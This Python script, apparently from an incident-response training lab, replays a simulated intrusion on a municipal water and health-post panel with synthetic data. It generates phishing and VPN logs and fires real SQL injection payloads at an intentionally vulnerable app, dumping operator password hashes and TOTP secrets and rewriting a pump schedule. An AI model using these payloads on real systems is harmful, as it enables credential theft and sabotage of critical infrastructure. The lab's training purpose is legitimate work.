"""Reproduz o incidente INC-VA-0712 em laboratorio (dados sinteticos, ambiente isolado).
As partes de web e banco rodam de verdade no painel legado. VPN, e-mail, proxy, atuador e telemetria
sao logs gerados por este script (nao temos esses sistemas aqui). O relogio e virtual, para a linha do
tempo ficar igual a do cenario. O log da VPN sai com relogio adiantado 192 s (equipamento sem NTP, como no incidente).
Uso: python3 lab/run_incident.py [pasta_saida]"""
import os, sys, json, datetime, random, shutil, tempfile
ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
OUT = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else os.path.join(ROOT, "lab_out", "INC-VA-0712"))
LOGS = os.path.join(OUT, "logs")
shutil.rmtree(OUT, ignore_errors=True)
os.makedirs(LOGS)
os.environ["VA_LOGS"] = LOGS
tmp = tempfile.mkdtemp()
os.environ["VA_DB_VULN"] = os.path.join(tmp, "vuln.db")
sys.path.insert(0, os.path.join(ROOT, "panel"))
import common as c
c.make_db(os.environ["VA_DB_VULN"], legacy=True)
import app_vulnerable as V

T = {"now": datetime.datetime(2026, 10, 16, 21, 30, tzinfo=datetime.timezone.utc)}
c.CLOCK = lambda: T["now"]
VPN_SKEW = 192  # segundos que o relogio da VPN estava adiantado
ATACANTE = "203.0.113.77"


def at(s):
    T["now"] = datetime.datetime.fromisoformat(s).replace(tzinfo=datetime.timezone.utc)


def skewed(source, **kw):
    real = T["now"]
    T["now"] = real + datetime.timedelta(seconds=VPN_SKEW)
    c.log_event(source, **kw)
    T["now"] = real


# 1) phishing
at("2026-10-16T21:32:10")
c.log_event("mail", event="delivered", to="coord1@vilaaurora.example", frm="atendimento@prefeitura-serraclara.example",
            subject="Atualizacao obrigatoria do acesso ao painel", spf="fail", dkim="none", dmarc="none",
            url="https://acesso-prefeitura-serraclara.example/painel")
at("2026-10-16T21:38:41")
c.log_event("proxy", event="http_get", host="acesso-prefeitura-serraclara.example", src="10.20.1.15", user="coord1")
at("2026-10-16T21:39:55")
c.log_event("proxy", event="http_post", host="acesso-prefeitura-serraclara.example", src="10.20.1.15", user="coord1", bytes=212,
            nota="envio de formulario (provavel usuario e senha)")

# 2) acesso pela VPN legada (senha, sem MFA). O log sai com 192 s de adiantamento.
at("2026-10-17T02:11:10")
skewed("vpn", event="auth_success", user="coord1", src=ATACANTE, method="password", mfa="none")

# 3) painel legado: login e SQL Injection (de verdade)
cl = V.app.test_client()
env = {"REMOTE_ADDR": ATACANTE}
at("2026-10-17T02:12:03")
cl.post("/login", data={"usuario": "coord1", "senha": "Vila123"}, environ_overrides=env)
passos = [
    ("2026-10-17T02:12:40", "Matheus' "),
    ("2026-10-17T02:13:02", "x%' OR 1=1 --"),
    ("2026-10-17T02:14:15", "zzz' UNION SELECT id,email,phone,kind FROM users --"),
    ("2026-10-17T02:15:09", "zzz' UNION SELECT username,pw_hash,role,totp_secret FROM operators --"),
    ("2026-10-17T02:16:30", "x%'; UPDATE schedule SET start_h=0, end_h=24 WHERE pump='bomba_escola'; --"),
]
saidas = []
for ts, q in passos:
    at(ts)
    r = cl.get("/historico", query_string={"q": q}, environ_overrides=env)
    saidas.append((ts, r.status_code, len((r.get_json() or {}).get("rows", []))))

# 4) borda aplica o novo agendamento (le o banco a cada 5 min)
at("2026-10-17T02:20:00")
c.log_event("actuator", cmd="schedule", pump="bomba_escola", start=0, end=24, via="db_sync", node="borda-escola")

# 5) telemetria: nivel da escola cai; fibra cai as 04:05; camara fria sobe
rnd = random.Random(1)
t = datetime.datetime(2026, 10, 17, 2, 0, tzinfo=datetime.timezone.utc)
nivel, temp = 72.0, 4.6
while t < datetime.datetime(2026, 10, 17, 9, 0, tzinfo=datetime.timezone.utc):
    T["now"] = t
    if t >= datetime.datetime(2026, 10, 17, 2, 20, tzinfo=datetime.timezone.utc):
        nivel = max(2.0, nivel - 1.5)
    if t >= datetime.datetime(2026, 10, 17, 4, 5, tzinfo=datetime.timezone.utc):
        temp += 0.09
    c.log_event("telemetry", node="borda-escola", metric="nivel_reservatorio", value=round(nivel + rnd.gauss(0, .3), 1))
    c.log_event("telemetry", node="borda-ubs", metric="temp_camara_fria", value=round(temp + rnd.gauss(0, .1), 1))
    t += datetime.timedelta(minutes=5)
at("2026-10-17T04:05:00")
c.log_event("edge", node="borda-ubs", event="wan_down", nota="fibra comunitaria caiu; alertas dependiam da nuvem")
at("2026-10-17T08:50:00")
c.log_event("edge", node="borda-ubs", event="humano_percebeu", nota="voluntaria da UBS percebeu a temperatura alta ao abrir")

json.dump({"saidas_sqli": saidas, "vpn_skew_s": VPN_SKEW}, open(os.path.join(OUT, "run_info.json"), "w"))
for f in sorted(os.listdir(LOGS)):
    print(f, sum(1 for _ in open(os.path.join(LOGS, f))), "linhas")
